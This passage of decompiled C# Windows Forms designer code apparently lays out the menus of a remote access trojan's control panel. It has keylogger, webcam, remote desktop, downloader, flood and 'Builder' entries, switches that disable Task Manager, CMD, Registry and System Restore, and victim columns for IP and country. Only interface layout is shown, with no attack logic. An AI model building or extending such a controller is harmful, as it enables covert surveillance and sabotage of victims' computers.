      this.HideToolStripMenuItem2.Image = (Image) componentResourceManager.GetObject("HideToolStripMenuItem2.Image");
      this.HideToolStripMenuItem2.Name = "HideToolStripMenuItem2";
      ToolStripMenuItem toolStripMenuItem2_4 = this.HideToolStripMenuItem2;
      size1 = new Size(103, 22);
      Size size64 = size1;
      toolStripMenuItem2_4.Size = size64;
      this.HideToolStripMenuItem2.Text = "Hide";
      this.IconsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.ShowToolStripMenuItem3,
        (ToolStripItem) this.HideToolStripMenuItem3
      });
      this.IconsToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("IconsToolStripMenuItem.Image");
      this.IconsToolStripMenuItem.Name = "IconsToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem52 = this.IconsToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size65 = size1;
      toolStripMenuItem52.Size = size65;
      this.IconsToolStripMenuItem.Text = "Icons";
      this.ShowToolStripMenuItem3.Image = (Image) componentResourceManager.GetObject("ShowToolStripMenuItem3.Image");
      this.ShowToolStripMenuItem3.Name = "ShowToolStripMenuItem3";
      ToolStripMenuItem toolStripMenuItem3_2 = this.ShowToolStripMenuItem3;
      size1 = new Size(103, 22);
      Size size66 = size1;
      toolStripMenuItem3_2.Size = size66;
      this.ShowToolStripMenuItem3.Text = "Show";
      this.HideToolStripMenuItem3.Image = (Image) componentResourceManager.GetObject("HideToolStripMenuItem3.Image");
      this.HideToolStripMenuItem3.Name = "HideToolStripMenuItem3";
      ToolStripMenuItem toolStripMenuItem3_3 = this.HideToolStripMenuItem3;
      size1 = new Size(103, 22);
      Size size67 = size1;
      toolStripMenuItem3_3.Size = size67;
      this.HideToolStripMenuItem3.Text = "Hide";
      this.ChangeProcessTitleToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ChangeProcessTitleToolStripMenuItem.Image");
      this.ChangeProcessTitleToolStripMenuItem.Name = "ChangeProcessTitleToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem53 = this.ChangeProcessTitleToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size68 = size1;
      toolStripMenuItem53.Size = size68;
      this.ChangeProcessTitleToolStripMenuItem.Text = "Change Start Button Text";
      this.ClipboardToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.LockToolStripMenuItem1,
        (ToolStripItem) this.InlockToolStripMenuItem
      });
      this.ClipboardToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ClipboardToolStripMenuItem.Image");
      this.ClipboardToolStripMenuItem.Name = "ClipboardToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem54 = this.ClipboardToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size69 = size1;
      toolStripMenuItem54.Size = size69;
      this.ClipboardToolStripMenuItem.Text = "Clipboard";
      this.LockToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("LockToolStripMenuItem1.Image");
      this.LockToolStripMenuItem1.Name = "LockToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_7 = this.LockToolStripMenuItem1;
      size1 = new Size(111, 22);
      Size size70 = size1;
      toolStripMenuItem1_7.Size = size70;
      this.LockToolStripMenuItem1.Text = "Lock";
      this.InlockToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("InlockToolStripMenuItem.Image");
      this.InlockToolStripMenuItem.Name = "InlockToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem55 = this.InlockToolStripMenuItem;
      size1 = new Size(111, 22);
      Size size71 = size1;
      toolStripMenuItem55.Size = size71;
      this.InlockToolStripMenuItem.Text = "Unlock";
      this.HidenFilesToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.EnabledToolStripMenuItem,
        (ToolStripItem) this.DisabledToolStripMenuItem
      });
      this.HidenFilesToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("HidenFilesToolStripMenuItem.Image");
      this.HidenFilesToolStripMenuItem.Name = "HidenFilesToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem56 = this.HidenFilesToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size72 = size1;
      toolStripMenuItem56.Size = size72;
      this.HidenFilesToolStripMenuItem.Text = "Hiden Files";
      this.EnabledToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("EnabledToolStripMenuItem.Image");
      this.EnabledToolStripMenuItem.Name = "EnabledToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem57 = this.EnabledToolStripMenuItem;
      size1 = new Size(119, 22);
      Size size73 = size1;
      toolStripMenuItem57.Size = size73;
      this.EnabledToolStripMenuItem.Text = "Enabled";
      this.DisabledToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DisabledToolStripMenuItem.Image");
      this.DisabledToolStripMenuItem.Name = "DisabledToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem58 = this.DisabledToolStripMenuItem;
      size1 = new Size(119, 22);
      Size size74 = size1;
      toolStripMenuItem58.Size = size74;
      this.DisabledToolStripMenuItem.Text = "Disabled";
      this.ToolStripMenuItem2.Image = (Image) componentResourceManager.GetObject("ToolStripMenuItem2.Image");
      this.ToolStripMenuItem2.Name = "ToolStripMenuItem2";
      ToolStripMenuItem toolStripMenuItem2_5 = this.ToolStripMenuItem2;
      size1 = new Size(206, 22);
      Size size75 = size1;
      toolStripMenuItem2_5.Size = size75;
      this.ToolStripMenuItem2.Text = "Change background";
      this.ToolStripMenuItem5.Image = (Image) componentResourceManager.GetObject("ToolStripMenuItem5.Image");
      this.ToolStripMenuItem5.Name = "ToolStripMenuItem5";
      ToolStripMenuItem toolStripMenuItem5_1 = this.ToolStripMenuItem5;
      size1 = new Size(206, 22);
      Size size76 = size1;
      toolStripMenuItem5_1.Size = size76;
      this.ToolStripMenuItem5.Text = "Change resolution";
      this.RegistryToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.BlockTaskManagerToolStripMenuItem,
        (ToolStripItem) this.EnableCMDToolStripMenuItem,
        (ToolStripItem) this.DisableRegistryToolStripMenuItem,
        (ToolStripItem) this.SystemRestoreToolStripMenuItem
      });
      this.RegistryToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RegistryToolStripMenuItem.Image");
      this.RegistryToolStripMenuItem.Name = "RegistryToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem59 = this.RegistryToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size77 = size1;
      toolStripMenuItem59.Size = size77;
      this.RegistryToolStripMenuItem.Text = "Registry";
      this.BlockTaskManagerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.EnableToolStripMenuItem3,
        (ToolStripItem) this.DisableToolStripMenuItem3
      });
      this.BlockTaskManagerToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("BlockTaskManagerToolStripMenuItem.Image");
      this.BlockTaskManagerToolStripMenuItem.Name = "BlockTaskManagerToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem60 = this.BlockTaskManagerToolStripMenuItem;
      size1 = new Size(154, 22);
      Size size78 = size1;
      toolStripMenuItem60.Size = size78;
      this.BlockTaskManagerToolStripMenuItem.Text = "TaskManager";
      this.EnableToolStripMenuItem3.Image = (Image) componentResourceManager.GetObject("EnableToolStripMenuItem3.Image");
      this.EnableToolStripMenuItem3.Name = "EnableToolStripMenuItem3";
      ToolStripMenuItem toolStripMenuItem3_4 = this.EnableToolStripMenuItem3;
      size1 = new Size(112, 22);
      Size size79 = size1;
      toolStripMenuItem3_4.Size = size79;
      this.EnableToolStripMenuItem3.Text = "Enable";
      this.DisableToolStripMenuItem3.Image = (Image) componentResourceManager.GetObject("DisableToolStripMenuItem3.Image");
      this.DisableToolStripMenuItem3.Name = "DisableToolStripMenuItem3";
      ToolStripMenuItem toolStripMenuItem3_5 = this.DisableToolStripMenuItem3;
      size1 = new Size(112, 22);
      Size size80 = size1;
      toolStripMenuItem3_5.Size = size80;
      this.DisableToolStripMenuItem3.Text = "Disable";
      this.EnableCMDToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.EnableToolStripMenuItem2,
        (ToolStripItem) this.DisableToolStripMenuItem2
      });
      this.EnableCMDToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("EnableCMDToolStripMenuItem.Image");
      this.EnableCMDToolStripMenuItem.Name = "EnableCMDToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem61 = this.EnableCMDToolStripMenuItem;
      size1 = new Size(154, 22);
      Size size81 = size1;
      toolStripMenuItem61.Size = size81;
      this.EnableCMDToolStripMenuItem.Text = "CMD";
      this.EnableToolStripMenuItem2.Image = (Image) componentResourceManager.GetObject("EnableToolStripMenuItem2.Image");
      this.EnableToolStripMenuItem2.Name = "EnableToolStripMenuItem2";
      ToolStripMenuItem toolStripMenuItem2_6 = this.EnableToolStripMenuItem2;
      size1 = new Size(112, 22);
      Size size82 = size1;
      toolStripMenuItem2_6.Size = size82;
      this.EnableToolStripMenuItem2.Text = "Enable";
      this.DisableToolStripMenuItem2.Image = (Image) componentResourceManager.GetObject("DisableToolStripMenuItem2.Image");
      this.DisableToolStripMenuItem2.Name = "DisableToolStripMenuItem2";
      ToolStripMenuItem toolStripMenuItem2_7 = this.DisableToolStripMenuItem2;
      size1 = new Size(112, 22);
      Size size83 = size1;
      toolStripMenuItem2_7.Size = size83;
      this.DisableToolStripMenuItem2.Text = "Disable";
      this.DisableRegistryToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.EnableToolStripMenuItem1,
        (ToolStripItem) this.DisableToolStripMenuItem1
      });
      this.DisableRegistryToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DisableRegistryToolStripMenuItem.Image");
      this.DisableRegistryToolStripMenuItem.Name = "DisableRegistryToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem62 = this.DisableRegistryToolStripMenuItem;
      size1 = new Size(154, 22);
      Size size84 = size1;
      toolStripMenuItem62.Size = size84;
      this.DisableRegistryToolStripMenuItem.Text = "Registry";
      this.EnableToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("EnableToolStripMenuItem1.Image");
      this.EnableToolStripMenuItem1.Name = "EnableToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_8 = this.EnableToolStripMenuItem1;
      size1 = new Size(112, 22);
      Size size85 = size1;
      toolStripMenuItem1_8.Size = size85;
      this.EnableToolStripMenuItem1.Text = "Enable";
      this.DisableToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("DisableToolStripMenuItem1.Image");
      this.DisableToolStripMenuItem1.Name = "DisableToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_9 = this.DisableToolStripMenuItem1;
      size1 = new Size(112, 22);
      Size size86 = size1;
      toolStripMenuItem1_9.Size = size86;
      this.DisableToolStripMenuItem1.Text = "Disable";
      this.SystemRestoreToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.EnableToolStripMenuItem,
        (ToolStripItem) this.DisableToolStripMenuItem
      });
      this.SystemRestoreToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SystemRestoreToolStripMenuItem.Image");
      this.SystemRestoreToolStripMenuItem.Name = "SystemRestoreToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem63 = this.SystemRestoreToolStripMenuItem;
      size1 = new Size(154, 22);
      Size size87 = size1;
      toolStripMenuItem63.Size = size87;
      this.SystemRestoreToolStripMenuItem.Text = "System Restore";
      this.EnableToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("EnableToolStripMenuItem.Image");
      this.EnableToolStripMenuItem.Name = "EnableToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem64 = this.EnableToolStripMenuItem;
      size1 = new Size(112, 22);
      Size size88 = size1;
      toolStripMenuItem64.Size = size88;
      this.EnableToolStripMenuItem.Text = "Enable";
      this.DisableToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DisableToolStripMenuItem.Image");
      this.DisableToolStripMenuItem.Name = "DisableToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem65 = this.DisableToolStripMenuItem;
      size1 = new Size(112, 22);
      Size size89 = size1;
      toolStripMenuItem65.Size = size89;
      this.DisableToolStripMenuItem.Text = "Disable";
      this.FunnyToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.PrintToolStripMenuItem,
        (ToolStripItem) this.FakeBSODToolStripMenuItem,
        (ToolStripItem) this.CapsLockToolStripMenuItem,
        (ToolStripItem) this.FakeMessageToolStripMenuItem
      });
      this.FunnyToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("FunnyToolStripMenuItem.Image");
      this.FunnyToolStripMenuItem.Name = "FunnyToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem66 = this.FunnyToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size90 = size1;
      toolStripMenuItem66.Size = size90;
      this.FunnyToolStripMenuItem.Text = "Funny";
      this.PrintToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("PrintToolStripMenuItem.Image");
      this.PrintToolStripMenuItem.Name = "PrintToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem67 = this.PrintToolStripMenuItem;
      size1 = new Size(147, 22);
      Size size91 = size1;
      toolStripMenuItem67.Size = size91;
      this.PrintToolStripMenuItem.Text = "Print";
      this.FakeBSODToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.ShowToolStripMenuItem4,
        (ToolStripItem) this.HideToolStripMenuItem4
      });
      this.FakeBSODToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("FakeBSODToolStripMenuItem.Image");
      this.FakeBSODToolStripMenuItem.Name = "FakeBSODToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem68 = this.FakeBSODToolStripMenuItem;
      size1 = new Size(147, 22);
      Size size92 = size1;
      toolStripMenuItem68.Size = size92;
      this.FakeBSODToolStripMenuItem.Text = "Fake BSOD";
      this.ShowToolStripMenuItem4.Image = (Image) componentResourceManager.GetObject("ShowToolStripMenuItem4.Image");
      this.ShowToolStripMenuItem4.Name = "ShowToolStripMenuItem4";
      ToolStripMenuItem toolStripMenuItem4_1 = this.ShowToolStripMenuItem4;
      size1 = new Size(103, 22);
      Size size93 = size1;
      toolStripMenuItem4_1.Size = size93;
      this.ShowToolStripMenuItem4.Text = "Show";
      this.HideToolStripMenuItem4.Image = (Image) componentResourceManager.GetObject("HideToolStripMenuItem4.Image");
      this.HideToolStripMenuItem4.Name = "HideToolStripMenuItem4";
      ToolStripMenuItem toolStripMenuItem4_2 = this.HideToolStripMenuItem4;
      size1 = new Size(103, 22);
      Size size94 = size1;
      toolStripMenuItem4_2.Size = size94;
      this.HideToolStripMenuItem4.Text = "Hide";
      this.CapsLockToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.OnToolStripMenuItem,
        (ToolStripItem) this.TurnOffToolStripMenuItem1
      });
      this.CapsLockToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("CapsLockToolStripMenuItem.Image");
      this.CapsLockToolStripMenuItem.Name = "CapsLockToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem69 = this.CapsLockToolStripMenuItem;
      size1 = new Size(147, 22);
      Size size95 = size1;
      toolStripMenuItem69.Size = size95;
      this.CapsLockToolStripMenuItem.Text = "Caps Lock";
      this.OnToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("OnToolStripMenuItem.Image");
      this.OnToolStripMenuItem.Name = "OnToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem70 = this.OnToolStripMenuItem;
      size1 = new Size(119, 22);
      Size size96 = size1;
      toolStripMenuItem70.Size = size96;
      this.OnToolStripMenuItem.Text = "Turn On";
      this.TurnOffToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("TurnOffToolStripMenuItem1.Image");
      this.TurnOffToolStripMenuItem1.Name = "TurnOffToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_10 = this.TurnOffToolStripMenuItem1;
      size1 = new Size(119, 22);
      Size size97 = size1;
      toolStripMenuItem1_10.Size = size97;
      this.TurnOffToolStripMenuItem1.Text = "Turn Off";
      this.FakeMessageToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("FakeMessageToolStripMenuItem.Image");
      this.FakeMessageToolStripMenuItem.Name = "FakeMessageToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem71 = this.FakeMessageToolStripMenuItem;
      size1 = new Size(147, 22);
      Size size98 = size1;
      toolStripMenuItem71.Size = size98;
      this.FakeMessageToolStripMenuItem.Text = "Fake Message";
      this.RemoteToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[6]
      {
        (ToolStripItem) this.DesktopToolStripMenuItem1,
        (ToolStripItem) this.ProcessManagerToolStripMenuItem,
        (ToolStripItem) this.KeyloggerToolStripMenuItem,
        (ToolStripItem) this.ChatToolStripMenuItem,
        (ToolStripItem) this.WebcamToolStripMenuItem,
        (ToolStripItem) this.ToolStripMenuItem3
      });
      this.RemoteToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RemoteToolStripMenuItem.Image");
      this.RemoteToolStripMenuItem.Name = "RemoteToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem72 = this.RemoteToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size99 = size1;
      toolStripMenuItem72.Size = size99;
      this.RemoteToolStripMenuItem.Text = "Remote";
      this.DesktopToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("DesktopToolStripMenuItem1.Image");
      this.DesktopToolStripMenuItem1.Name = "DesktopToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_11 = this.DesktopToolStripMenuItem1;
      size1 = new Size(164, 22);
      Size size100 = size1;
      toolStripMenuItem1_11.Size = size100;
      this.DesktopToolStripMenuItem1.Text = "Desktop";
      this.ProcessManagerToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ProcessManagerToolStripMenuItem.Image");
      this.ProcessManagerToolStripMenuItem.Name = "ProcessManagerToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem73 = this.ProcessManagerToolStripMenuItem;
      size1 = new Size(164, 22);
      Size size101 = size1;
      toolStripMenuItem73.Size = size101;
      this.ProcessManagerToolStripMenuItem.Text = "Process Manager";
      this.KeyloggerToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("KeyloggerToolStripMenuItem.Image");
      this.KeyloggerToolStripMenuItem.Name = "KeyloggerToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem74 = this.KeyloggerToolStripMenuItem;
      size1 = new Size(164, 22);
      Size size102 = size1;
      toolStripMenuItem74.Size = size102;
      this.KeyloggerToolStripMenuItem.Text = "Keylogger";
      this.ChatToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ChatToolStripMenuItem.Image");
      this.ChatToolStripMenuItem.Name = "ChatToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem75 = this.ChatToolStripMenuItem;
      size1 = new Size(164, 22);
      Size size103 = size1;
      toolStripMenuItem75.Size = size103;
      this.ChatToolStripMenuItem.Text = "Chat";
      this.WebcamToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("WebcamToolStripMenuItem.Image");
      this.WebcamToolStripMenuItem.Name = "WebcamToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem76 = this.WebcamToolStripMenuItem;
      size1 = new Size(164, 22);
      Size size104 = size1;
      toolStripMenuItem76.Size = size104;
      this.WebcamToolStripMenuItem.Text = "Webcam";
      this.ToolStripMenuItem3.Image = (Image) componentResourceManager.GetObject("ToolStripMenuItem3.Image");
      this.ToolStripMenuItem3.Name = "ToolStripMenuItem3";
      ToolStripMenuItem toolStripMenuItem3_6 = this.ToolStripMenuItem3;
      size1 = new Size(164, 22);
      Size size105 = size1;
      toolStripMenuItem3_6.Size = size105;
      this.ToolStripMenuItem3.Text = "File Manager";
      this.OtherToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.FloodToolStripMenuItem,
        (ToolStripItem) this.RenameFileToolStripMenuItem,
        (ToolStripItem) this.ToolStripMenuItem4
      });
      this.OtherToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("OtherToolStripMenuItem.Image");
      this.OtherToolStripMenuItem.Name = "OtherToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem77 = this.OtherToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size106 = size1;
      toolStripMenuItem77.Size = size106;
      this.OtherToolStripMenuItem.Text = "Other";
      this.FloodToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("FloodToolStripMenuItem.Image");
      this.FloodToolStripMenuItem.Name = "FloodToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem78 = this.FloodToolStripMenuItem;
      size1 = new Size(138, 22);
      Size size107 = size1;
      toolStripMenuItem78.Size = size107;
      this.FloodToolStripMenuItem.Text = "Flood";
      this.RenameFileToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RenameFileToolStripMenuItem.Image");
      this.RenameFileToolStripMenuItem.Name = "RenameFileToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem79 = this.RenameFileToolStripMenuItem;
      size1 = new Size(138, 22);
      Size size108 = size1;
      toolStripMenuItem79.Size = size108;
      this.RenameFileToolStripMenuItem.Text = "Rename File";
      this.ToolStripMenuItem4.Image = (Image) componentResourceManager.GetObject("ToolStripMenuItem4.Image");
      this.ToolStripMenuItem4.Name = "ToolStripMenuItem4";
      ToolStripMenuItem toolStripMenuItem4_3 = this.ToolStripMenuItem4;
      size1 = new Size(138, 22);
      Size size109 = size1;
      toolStripMenuItem4_3.Size = size109;
      this.ToolStripMenuItem4.Text = "Downloader";
      this.OpenCMDToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("OpenCMDToolStripMenuItem.Image");
      this.OpenCMDToolStripMenuItem.Name = "OpenCMDToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem80 = this.OpenCMDToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size110 = size1;
      toolStripMenuItem80.Size = size110;
      this.OpenCMDToolStripMenuItem.Text = "Open Program";
      this.OpenWebSiteToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("OpenWebSiteToolStripMenuItem.Image");
      this.OpenWebSiteToolStripMenuItem.Name = "OpenWebSiteToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem81 = this.OpenWebSiteToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size111 = size1;
      toolStripMenuItem81.Size = size111;
      this.OpenWebSiteToolStripMenuItem.Text = "Open WebSite";
      this.GetFlagToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("GetFlagToolStripMenuItem.Image");
      this.GetFlagToolStripMenuItem.Name = "GetFlagToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem82 = this.GetFlagToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size112 = size1;
      toolStripMenuItem82.Size = size112;
      this.GetFlagToolStripMenuItem.Text = "Get Flag";
      this.ResponseToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ResponseToolStripMenuItem.Image");
      this.ResponseToolStripMenuItem.Name = "ResponseToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem83 = this.ResponseToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size113 = size1;
      toolStripMenuItem83.Size = size113;
      this.ResponseToolStripMenuItem.Text = "Response";
      this.DeleteFromListToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DeleteFromListToolStripMenuItem.Image");
      this.DeleteFromListToolStripMenuItem.Name = "DeleteFromListToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem84 = this.DeleteFromListToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size114 = size1;
      toolStripMenuItem84.Size = size114;
      this.DeleteFromListToolStripMenuItem.Text = "Delete From List";
      this.CloseToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("CloseToolStripMenuItem1.Image");
      this.CloseToolStripMenuItem1.Name = "CloseToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_12 = this.CloseToolStripMenuItem1;
      size1 = new Size(159, 22);
      Size size115 = size1;
      toolStripMenuItem1_12.Size = size115;
      this.CloseToolStripMenuItem1.Text = "Close";
      this.RefreshToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RefreshToolStripMenuItem.Image");
      this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem85 = this.RefreshToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size116 = size1;
      toolStripMenuItem85.Size = size116;
      this.RefreshToolStripMenuItem.Text = "Refresh";
      this.HideShowToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[6]
      {
        (ToolStripItem) this.CountryToolStripMenuItem,
        (ToolStripItem) this.OSToolStripMenuItem,
        (ToolStripItem) this.IPToolStripMenuItem,
        (ToolStripItem) this.CountryToolStripMenuItem1,
        (ToolStripItem) this.CPUToolStripMenuItem,
        (ToolStripItem) this.RAMToolStripMenuItem
      });
      this.HideShowToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("HideShowToolStripMenuItem.Image");
      this.HideShowToolStripMenuItem.Name = "HideShowToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem86 = this.HideShowToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size117 = size1;
      toolStripMenuItem86.Size = size117;
      this.HideShowToolStripMenuItem.Text = "Hide / Show";
      this.CountryToolStripMenuItem.Checked = true;
      this.CountryToolStripMenuItem.CheckOnClick = true;
      this.CountryToolStripMenuItem.CheckState = CheckState.Checked;
      this.CountryToolStripMenuItem.Name = "CountryToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem87 = this.CountryToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size118 = size1;
      toolStripMenuItem87.Size = size118;
      this.CountryToolStripMenuItem.Text = "Computer";
      this.OSToolStripMenuItem.Checked = true;
      this.OSToolStripMenuItem.CheckOnClick = true;
      this.OSToolStripMenuItem.CheckState = CheckState.Checked;
      this.OSToolStripMenuItem.Name = "OSToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem88 = this.OSToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size119 = size1;
      toolStripMenuItem88.Size = size119;
      this.OSToolStripMenuItem.Text = "Win";
      this.IPToolStripMenuItem.Checked = true;
      this.IPToolStripMenuItem.CheckOnClick = true;
      this.IPToolStripMenuItem.CheckState = CheckState.Checked;
      this.IPToolStripMenuItem.Name = "IPToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem89 = this.IPToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size120 = size1;
      toolStripMenuItem89.Size = size120;
      this.IPToolStripMenuItem.Text = "IP";
      this.CountryToolStripMenuItem1.Checked = true;
      this.CountryToolStripMenuItem1.CheckOnClick = true;
      this.CountryToolStripMenuItem1.CheckState = CheckState.Checked;
      this.CountryToolStripMenuItem1.Name = "CountryToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_13 = this.CountryToolStripMenuItem1;
      size1 = new Size(128, 22);
      Size size121 = size1;
      toolStripMenuItem1_13.Size = size121;
      this.CountryToolStripMenuItem1.Text = "Country";
      this.CPUToolStripMenuItem.Checked = true;
      this.CPUToolStripMenuItem.CheckOnClick = true;
      this.CPUToolStripMenuItem.CheckState = CheckState.Checked;
      this.CPUToolStripMenuItem.Name = "CPUToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem90 = this.CPUToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size122 = size1;
      toolStripMenuItem90.Size = size122;
      this.CPUToolStripMenuItem.Text = "CPU";
      this.RAMToolStripMenuItem.Checked = true;
      this.RAMToolStripMenuItem.CheckOnClick = true;
      this.RAMToolStripMenuItem.CheckState = CheckState.Checked;
      this.RAMToolStripMenuItem.Name = "RAMToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem91 = this.RAMToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size123 = size1;
      toolStripMenuItem91.Size = size123;
      this.RAMToolStripMenuItem.Text = "RAM";
      this.checkusers.Interval = 500000;
      this.menubar.BackColor = SystemColors.ButtonShadow;
      this.menubar.Items.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.MenuToolStripMenuItem,
        (ToolStripItem) this.UpdateToolStripMenuItem,
        (ToolStripItem) this.AboutToolStripMenuItem
      });
      MenuStrip menubar1 = this.menubar;
      Point point1 = new Point(0, 0);
      Point point2 = point1;
      menubar1.Location = point2;
      this.menubar.Name = "menubar";
      MenuStrip menubar2 = this.menubar;
      size1 = new Size(787, 24);
      Size size124 = size1;
      menubar2.Size = size124;
      this.menubar.TabIndex = 6;
      this.menubar.Text = "MenuStrip1";
      this.MenuToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.BuilderToolStripMenuItem,
        (ToolStripItem) this.ExtraToolStripMenuItem,
        (ToolStripItem) this.SettingsToolStripMenuItem,
        (ToolStripItem) this.ExitToolStripMenuItem
      });
      this.MenuToolStripMenuItem.Name = "MenuToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem92 = this.MenuToolStripMenuItem;
      size1 = new Size(50, 20);
      Size size125 = size1;
      toolStripMenuItem92.Size = size125;
      this.MenuToolStripMenuItem.Text = "Menu";
      this.BuilderToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("BuilderToolStripMenuItem.Image");
      this.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem";
